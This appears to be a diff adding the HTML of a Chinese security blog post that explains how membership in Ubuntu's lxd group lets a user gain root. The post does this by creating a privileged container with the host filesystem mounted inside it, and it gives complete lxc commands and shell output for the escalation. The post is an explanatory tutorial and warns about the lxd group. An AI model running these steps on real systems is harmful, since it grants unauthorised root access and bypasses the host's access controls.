@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="介绍LXD是Ubuntu的使用linux容器的容器管理器。可以认为它与docker在同一领域内发挥作用， 应该将lxd组视为与docker组危害方式相同。在任何情况下，都不应授予本地容器中的用户访问lxd组的权限。这是因为要利用它完全是微不足道的。 首先，检查用户是否是该组的成员，因为如果安装了它并且是sudoer，则很可能是安装后，lxd会自动将每个用户添加到lxd组中。考虑到sudoer自动具">
+<meta property="og:type" content="article">
+<meta property="og:title" content="lxd容器提权">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/01/20/Privilege-Escalation-via-lxd/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="介绍LXD是Ubuntu的使用linux容器的容器管理器。可以认为它与docker在同一领域内发挥作用， 应该将lxd组视为与docker组危害方式相同。在任何情况下，都不应授予本地容器中的用户访问lxd组的权限。这是因为要利用它完全是微不足道的。 首先，检查用户是否是该组的成员，因为如果安装了它并且是sudoer，则很可能是安装后，lxd会自动将每个用户添加到lxd组中。考虑到sudoer自动具">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-01-20T02:57:05.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:55:57.141Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="linux提权">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/01/20/Privilege-Escalation-via-lxd/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/01/20/Privilege-Escalation-via-lxd/","path":"2020/01/20/Privilege-Escalation-via-lxd/","title":"lxd容器提权"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>lxd容器提权 | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E9%9D%A2%E6%8E%A8%E8%8D%90%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E7%94%A8%E4%BA%8Elxd%E6%8F%90%E6%9D%83%E7%9A%84%E5%AE%B9%E5%99%A8"><span class="nav-number">3.</span> <span class="nav-text">下面推荐一个可以用于lxd提权的容器</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/01/20/Privilege-Escalation-via-lxd/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="lxd容器提权 | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          lxd容器提权
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-01-20 10:57:05" itemprop="dateCreated datePublished" datetime="2020-01-20T10:57:05+08:00">2020-01-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:55:57" itemprop="dateModified" datetime="2020-08-17T00:55:57+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/linux%E6%8F%90%E6%9D%83/" itemprop="url" rel="index"><span itemprop="name">linux提权</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>LXD是Ubuntu的使用linux容器的容器管理器。可以认为它与docker在同一领域内发挥作用，</p>
+<p>应该将lxd组视为与<span class="exturl" data-url="aHR0cHM6Ly93d3cuem9weXguZGUvYW5kcmVhcy1qdW5nL2NvbnRlbnRzL29uLWRvY2tlci1zZWN1cml0eS1kb2NrZXItZ3JvdXAtY29uc2lkZXJlZC1oYXJtZnVs">docker<i class="fa fa-external-link-alt"></i></span>组危害方式相同。在任何情况下，都不应授予本地容器中的用户访问lxd组的权限。这是因为要利用它完全是微不足道的。</p>
+<p>首先，检查用户是否是该组的成员，因为如果安装了它并且是sudoer，则很可能是安装后，lxd会自动将每个用户添加到lxd组中。考虑到sudoer自动具有root用户访问权限，这可能被认为是可以的，但它忘记了sudo具有适当的审核功能，并且确实需要密码来执行root用户所需的任何操作。实际上，仅安装lxd等效于在sudoers文件中添加以下内容。</p>
+<span id="more"></span>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin    ALL=NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
+
+<p>如果某人获得了对管理员帐户的访问权限，那么他们将立即获得完全的root访问权限，而无需输入密码。考虑一个逃避到外的ssh私钥或在该用户下运行的过时服务，突然之间，一个仍然没有破解管理员帐户密码的攻击者就具有完全的root用户访问权限，这都是因为您安装了lxd。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">cat</span> /etc/passwd | grep 1000 </span><br><span class="line">ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash </span><br><span class="line">ubuntu@ubuntu:~$ <span class="built_in">cat</span> /etc/group | grep ubuntu </span><br><span class="line">adm:x:4:syslog,ubuntu </span><br><span class="line">cdrom:x:24:ubuntu </span><br><span class="line">sudo:x:27:ubuntu </span><br><span class="line">dip:x:30:ubuntu </span><br><span class="line">plugdev:x:46:ubuntu </span><br><span class="line">lpadmin:x:113:ubuntu </span><br><span class="line">ubuntu:x:1000: </span><br><span class="line">sambashare:x:128:ubuntu </span><br><span class="line">ubuntu@ubuntu:~$ sudo su </span><br><span class="line">[sudo] password <span class="keyword">for</span> ubuntu:  </span><br><span class="line">root@ubuntu:/home/ubuntu<span class="comment"># apt-get install lxd </span></span><br><span class="line">----SNIP----</span><br><span class="line">root@ubuntu:/home/ubuntu<span class="comment"># cat /etc/passwd | grep 1000 </span></span><br><span class="line">ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash </span><br><span class="line">root@ubuntu:/home/ubuntu<span class="comment"># cat /etc/group | grep ubuntu </span></span><br><span class="line">adm:x:4:syslog,ubuntu </span><br><span class="line">cdrom:x:24:ubuntu </span><br><span class="line">sudo:x:27:ubuntu </span><br><span class="line">dip:x:30:ubuntu </span><br><span class="line">plugdev:x:46:ubuntu </span><br><span class="line">lpadmin:x:113:ubuntu </span><br><span class="line">ubuntu:x:1000: </span><br><span class="line">sambashare:x:128:ubuntu </span><br><span class="line">lxd:x:129:ubuntu </span><br></pre></td></tr></table></figure>
+
+<p>并不是在反对lxd组的存在，只是在不通知用户的情况下增加了攻击面。发现这归结于用户没有意识到该组赋予其帐户的功能，并且尽管删除了sudo特权，但没有进行lxd访问。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因此，我非常想了解安全风险，但让我们看看实际情况。只因为<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x4Yy9seGQvaXNzdWVzLzIwMDM=">2003<i class="fa fa-external-link-alt"></i></span>而发现了这一点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lxc init ubuntu:16.04 <span class="built_in">test</span> -c security.privileged=<span class="literal">true</span> </span><br><span class="line">Creating <span class="built_in">test</span> </span><br><span class="line">ubuntu@ubuntu:~$ lxc config device add <span class="built_in">test</span> whatever disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span> </span><br><span class="line">Device whatever added to <span class="built_in">test</span> </span><br><span class="line">ubuntu@ubuntu:~$ lxc start <span class="built_in">test</span> </span><br><span class="line">ubuntu@ubuntu:~$ lxc <span class="built_in">exec</span> <span class="built_in">test</span> bash </span><br></pre></td></tr></table></figure>
+
+<p>在这里，我们创建了一个lxc容器，为其分配了安全性特权，并将整个磁盘安装在&#x2F;mnt&#x2F;root下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lxc <span class="built_in">exec</span> <span class="built_in">test</span> bash </span><br><span class="line">root@<span class="built_in">test</span>:~<span class="comment"># cd /mnt/root </span></span><br><span class="line">root@<span class="built_in">test</span>:/mnt/root<span class="comment"># ls </span></span><br><span class="line">bin   cdrom  etc   initrd.img  lib64       media  opt   root  sbin  srv  tmp  var </span><br><span class="line">boot  dev    home  lib         lost+found  mnt    proc  run   snap  sys  usr  vmlinuz </span><br><span class="line">root@<span class="built_in">test</span>:/mnt/root<span class="comment"># cd root </span></span><br><span class="line">root@<span class="built_in">test</span>:/mnt/root/root<span class="comment"># ls </span></span><br><span class="line">root@<span class="built_in">test</span>:/mnt/root/root<span class="comment"># touch ICanDoWhatever </span></span><br><span class="line">root@<span class="built_in">test</span>:/mnt/root/root<span class="comment"># exit </span></span><br><span class="line"><span class="built_in">exit</span> </span><br><span class="line">ubuntu@ubuntu:~$ <span class="built_in">cat</span> /root/ICanDoWhatever </span><br><span class="line"><span class="built_in">cat</span>: /root/ICanDoWhatever: Permission denied </span><br><span class="line">ubuntu@ubuntu:~$ sudo su </span><br><span class="line">root@ubuntu:/home/ubuntu<span class="comment"># cat /root/ICanDoWhatever </span></span><br><span class="line">root@ubuntu:/home/ubuntu<span class="comment"># ls /root </span></span><br><span class="line">ICanDoWhatever </span><br><span class="line">root@ubuntu:/home/ubuntu<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<p>现在，来看看如何一次无需手动输入密码或提升权限。我们甚至可以将自己从sudoers中移除，并执行所有这些操作，从而使提权到root变得非常简单。吸取教训后，请谨慎使用lxd组。</p>
+<h3 id="下面推荐一个可以用于lxd提权的容器"><a href="#下面推荐一个可以用于lxd提权的容器" class="headerlink" title="下面推荐一个可以用于lxd提权的容器"></a>下面推荐一个可以用于lxd提权的容器</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhZ2h1bC9seGQtYWxwaW5lLWJ1aWxkZXI=">LXD Alpine Linux image builder<i class="fa fa-external-link-alt"></i></span></p>
+<p>该脚本提供了一种创建Alpine Linux映像以与LXD一起使用的方法。它基于LXC模板。仅通过安装基于alpine的meta-package即可构建映像。默认情况下启用网络和系统日志。</p>
+<p>用法：</p>
+<p>为了构建最新的Alpine映像，只需运行脚本（必须以root身份完成）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./build-alpine</span><br></pre></td></tr></table></figure>
+
+<p>有关更多选项，请查看帮助：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./build-alpine -h</span><br></pre></td></tr></table></figure>
+
+<p>生成映像后，可以将其作为映像添加到LXD中，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc image import alpine-v3.3-x86_64-20160114_2308.tar.gz --<span class="built_in">alias</span> alpine-v3.3</span><br></pre></td></tr></table></figure>
+
+<p><font color="red">注意：</font></p>
+<p>如果运行提权命令之前，状态如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc list</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">|     NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">| right-whippet | STOPPED |      |      | PERSISTENT | 0         |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br></pre></td></tr></table></figure>
+
+<p>需要运行下面命令来启动容器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ta@neuromancer:/tmp$ lxc start right-whippet</span><br><span class="line">ta@neuromancer:/tmp$ lxc list</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">|     NAME      |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br><span class="line">| right-whippet | RUNNING |      |      | PERSISTENT | 0         |</span><br><span class="line">+---------------+---------+------+------+------------+-----------+</span><br></pre></td></tr></table></figure>
+
+<p>然后运行下面命令提权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lxc <span class="built_in">exec</span> right-whippet --mode=interactive /bin/sh</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">lxc <span class="built_in">exec</span> right-whippet bash</span><br></pre></td></tr></table></figure>
+
+<p><font color="blue"><em><strong>By:lucifer11——QQ:1185151867</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/01/20/Privilege-Escalation-via-lxd/" title="lxd容器提权">https://fdlucifer.github.io/2020/01/20/Privilege-Escalation-via-lxd/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> linux提权</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/" rel="prev" title="将simpleshell提升为全交互式的TTYshell">
+                  <i class="fa fa-chevron-left"></i> 将simpleshell提升为全交互式的TTYshell
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/01/20/reverse-shell/" rel="next" title="reverse shell 大全">
+                  reverse shell 大全 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
